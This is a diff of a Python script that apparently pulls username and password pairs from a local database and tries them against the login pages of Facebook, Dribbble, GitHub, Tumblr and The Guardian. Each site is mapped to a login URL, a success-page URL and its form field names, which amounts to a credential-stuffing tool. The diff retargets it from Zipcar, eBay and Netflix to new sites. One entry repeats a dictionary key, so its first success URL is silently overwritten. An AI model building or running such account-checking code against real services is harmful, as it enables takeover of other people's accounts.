@@ -26,32 +26,33 @@ connection = pymysql.connect(host='localhost',
 # enum for the sites
 class Site(str, Enum):
     Facebook = "facebook"
-    Zipcar = "zipcar"
-    Ebay = "ebay"
+    Dribbble = "dribbble"
+    Github = "github"
     Tumblr = "tumblr"
-    Netflix = "netflix"
+    TheGuardian = "theguardian"
 
 # Dictionary of sites that we can attempt to authenticate
 urls = {
     Site.Facebook: {
         "attempt": "http://www.facebook.com/login.php",
-        "correct": "https://www.facebook.com/checkpoint/?next"
+        "correct": "https://www.facebook.com/checkpoint/?next",
+	"correct": "https://www.facebook.com/?sk=welcome"
     },
-    Site.Zipcar: {
-        "attempt": "https://members.zipcar.com/register/",
-        "correct": "https://members.zipcar.com/reservations/reserve"
+    Site.Dribbble: {
+	"attempt": "https://dribbble.com/session/new",
+	"correct": "https://dribbble.com/"	
     },
-    Site.Ebay: {
-        "attempt": "https://signin.ebay.com/ws/eBayISAPI.dll?SignIn&ru=https%3A%2F%2Fwww.ebay.com%2F",
-        "correct": "https://www.ebay.com/"
+    Site.Github: {
+	"attempt": "https://github.com/login",
+        "correct": "https://github.com/"
     },
     Site.Tumblr: {
         "attempt": "https://www.tumblr.com/login",
         "correct": "https://www.tumblr.com/dashboard"
     },
-    Site.Netflix: {
-        "attempt": "https://www.netflix.com/login",
-        "correct": "https://www.netflix.com/browse"
+    Site.TheGuardian: {
+        "attempt": "https://profile.theguardian.com/signin?INTCMP=DOTCOM_HEADER_SIGNIN",
+        "correct": "https://www.theguardian.com/us"
     }
 }
 
@@ -115,16 +116,16 @@ def attempt_authentication(site, username, password):
         if site == Site.Facebook:
             browser.form['email'] = username
             browser.form['pass'] = password
-        if site == Site.Zipcar:
-            browser.form['user_name'] = username
+        if site == Site.Dribbble:
+            browser.form['login'] = username
             browser.form['password'] = password
-        if site == Site.Ebay:
-            browser.form['userid'] = username
-            browser.form['pass'] = password
+        if site == Site.Github:
+            browser.form['login'] = username
+            browser.form['password'] = password
         if site == Site.Tumblr:
             browser.form['user[email]'] = username
             browser.form['user[password]'] = password
-        if site == Site.Netflix:
+        if site == Site.TheGuardian:
             browser.form['email'] = username
             browser.form['password'] = password
 
